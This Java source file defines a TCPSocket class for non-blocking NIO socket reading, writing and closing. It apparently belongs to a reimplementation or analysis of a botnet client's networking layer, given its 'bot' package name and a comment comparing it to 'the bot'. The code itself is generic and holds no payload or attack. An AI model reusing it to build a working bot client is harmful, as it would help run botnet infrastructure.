package diff.notcompatible.c.bot.net.tcp;

import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.channels.SelectionKey;
import java.nio.channels.SocketChannel;

import diff.notcompatible.c.bot.net.CustomSocket;
import diff.notcompatible.c.bot.objects.MyBuffer;

public class TCPSocket extends CustomSocket {
    public boolean sendAndClose;
    public SocketChannel channel;
    public MyBuffer readBuffer;
    public SelectionKey selfKey;
    public ByteBuffer tmpBuffer;
    public MyBuffer writeBuffer;

    public TCPSocket() {
        sendAndClose = false;
        readBuffer = new MyBuffer();
        writeBuffer = new MyBuffer();
        tmpBuffer = ByteBuffer.allocate(0x2000);
    }

    private void writeBuff(byte[] src) {
        writeBuffer.put(src);
        selfKey.interestOps(selfKey.interestOps() | 4);
    }

    public void send(MyBuffer src) throws IOException {
        writeBuff(src.array());
    }

    public void send(ByteBuffer src) throws IOException {
        writeBuff(src.array());
    }

    public void send(byte[] src) throws IOException {
        writeBuff(src);
    }

    @Override
    public void onClose(SelectionKey key) throws IOException {
        super.onClose(key);
    }

    @Override
    public void onConnect(SelectionKey key) throws IOException {
        super.onConnect(key);
        // Ask for OP_WRITE only if there is something to write and it is not already asked for
        if ((writeBuffer.size != 0) && ((key.interestOps() & 4) != 4)) {
            key.interestOps(key.interestOps() ^ 4);
        }
    }

    @Override
    public void onNoConnect(SelectionKey key) throws IOException {
        super.onNoConnect(key);
    }

    @Override
    public void onRead(SelectionKey key) throws IOException {
        super.onRead(key);

        // Like TCPSocket.onRead() in the bot: end of stream (or not connected at all) closes the channel
        // and calls onClose + cancel, a not-connected channel additionally gets onNoConnect first.
        try {
            int count;
            if (channel.isConnected()) {
                tmpBuffer.position(0);
                count = channel.read(tmpBuffer);
            } else {
                channel.close();
                onNoConnect(key);
                count = -1;
            }

            if (count == -1) {
                channel.close();
                onClose(key);
                key.cancel();
            } else {
                readBuffer.put(tmpBuffer.array(), count);
            }
        } catch (IOException e) {
            channel.close();
            key.cancel();
            onClose(key);
        }
    }

    @Override
    public void onWrite(SelectionKey key) throws IOException {
        super.onWrite(key);
        writeBuffer.buffer.position(0);
        writeBuffer.shift(channel.write(writeBuffer.buffer));
        if ((writeBuffer.size == 0) && ((key.interestOps() & 4) == 4)) {
            key.interestOps(key.interestOps() ^ 4);
        }
        // A partial write just waits for the next OP_WRITE; only a drained buffer + sendAndClose closes
        if ((writeBuffer.size == 0) && sendAndClose) {
            channel.close();
            onClose(selfKey);
        }
    }
}
